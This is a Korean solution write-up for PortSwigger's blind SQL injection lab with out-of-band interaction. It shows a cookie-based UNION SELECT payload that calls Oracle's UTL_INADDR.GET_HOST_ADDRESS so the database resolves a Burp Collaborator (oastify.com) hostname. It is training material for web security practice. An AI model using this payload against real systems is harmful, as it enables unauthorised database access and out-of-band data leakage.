---
title: "Blind SQL injection with out-of-band interaction"
tags:
  - portswigger
  - sql-injection
lab_url: "https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band"
difficulty: Practitioner
note_kind: solution
draft: false
---

# Blind SQL injection with out-of-band interaction

## 문제 조건과 설명

분석용 추적 쿠키의 값이 SQL 조회에 사용된다. 그러나 이 조회는 **비동기식**으로 실행되고 애플리케이션 응답에 영향을 주지 않는다. 화면의 문구, SQL 오류, 응답 시간으로 결과를 읽는 앞선 실습과 조건이 다르다. 공식 설명은 대신 주입된 조회를 통해 외부 도메인과 별도의 네트워크 상호작용을 일으킬 수 있다고 알려 준다.

**관찰 지점이 웹 응답 밖에 있다**

이 문제의 증거는 실습 페이지의 HTML이나 HTTP 상태 코드가 아니라, 지정한 외부 도메인 쪽에 도착한 **DNS 조회 기록**이다. 요청을 보낸 직후 페이지가 평소와 똑같이 보이더라도 SQL이 실행되지 않았다는 뜻은 아니다. 반대로 외부 이벤트를 보지 못한 채 요청 자체가 정상 처리되었다고 해서 목표를 달성한 것도 아니다.

**완료 조건은 SQL injection으로 Burp Collaborator에 대한 DNS 조회를 발생시키는 것**이다. 여기서는 사용자 비밀번호를 빼내거나 로그인할 필요가 없다. 실제 검증에서는 보낸 요청과 외부 이벤트를 연결할 수 있도록 식별 가능한 Collaborator 주소를 사용하고, 요청 후 해당 DNS 이벤트가 도착했는지 확인해야 한다.

**실습 환경의 제한**

공식 설명의 주의 문구에 따르면 Academy 방화벽은 실습에서 임의의 외부 시스템으로 향하는 상호작용을 차단한다. **Burp Collaborator의 기본 공개 서버를 사용해야 한다.** 임의의 도메인에서 이벤트가 보이지 않는다면 SQL 조건이 틀렸다는 결론부터 내릴 수 없다. 쿠키 이름, 주입 구문, 실제 DNS 이벤트는 문제 설명에 없으므로 직접 시도한 뒤 아래에 기록한다.

출처: [PortSwigger 실습 설명](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band)

## 탐색 및 풀이 기록

### 초기 관찰

입력 지점은 쇼핑몰 첫 화면 요청의 `TrackingId` 쿠키였다. 새 실습 인스턴스에서 원래 쿠키로 요청했을 때 HTTP 200, 본문 11501자가 반환됐고 실습은 미완료 상태였다. 외부 조회 대상에는 PortSwigger 공개 Collaborator 서버의 `*.oastify.com` 아래에 고유한 하위 도메인을 사용했다.

### 실행 과정

`TrackingId` 값 뒤에 `UNION SELECT`를 붙이고 Oracle의 `UTL_INADDR.GET_HOST_ADDRESS`를 호출했다. 이 함수는 **호스트 이름을 IP 주소로 해석해 반환**한다. 따라서 인자로 고유한 Collaborator 호스트 이름을 주면 데이터베이스 서버가 그 이름을 조회한다. 이 실습은 반환된 IP를 화면에 보여 주는 것이 아니라, 조회 과정에서 일어나는 DNS 요청을 목표로 한다. `FROM dual`은 Oracle에서 이 표현식을 계산하기 위한 한 행짜리 테이블이다. [Oracle 함수 문서](https://docs.oracle.com/en/database/oracle/oracle-database/19/arpls/UTL_INADDR.html)

~~~sql fragment
<원래 TrackingId>' UNION SELECT
UTL_INADDR.GET_HOST_ADDRESS('<고유값>.oastify.com')
FROM dual--
~~~

PowerShell에서 구문의 공백을 `+`로 바꾼 뒤 `Cookie` 헤더의 `TrackingId`에 넣어 첫 화면을 요청했다. 주입 직후에는 정상 요청과 같은 **HTTP 200, 본문 11501자, 미완료**였다. 몇 초 뒤 다시 첫 화면을 요청하자 **HTTP 200, 본문 14505자**와 실습 완료 배너가 나타났다.

## 최종 결과

페이지에 `Congratulations, you solved the lab!` 배너가 표시돼 완료를 확인했다.

## 배운 점

`UTL_INADDR.GET_HOST_ADDRESS`는 IP 주소를 얻는 함수지만, 호스트 이름을 해석하는 과정 자체가 이 문제에서 필요한 DNS 조회를 만든다. Oracle에서는 네트워크 접근 권한에 따라 이 함수가 제한될 수 있으므로 항상 통하는 구문은 아니다. 이번 인스턴스에서는 짧은 함수 호출만으로 완료됐다. 비동기식 조회라 주입 직후의 웹 응답은 그대로였고, 잠시 뒤 완료 상태가 바뀌었다. [PortSwigger SQL 인젝션 치트시트](https://portswigger.net/web-security/sql-injection/cheat-sheet)

## 관련 개념

- [SQL 기초와 SQL 인젝션이 생기는 원리](../../concepts/sql-injection-foundations.md)
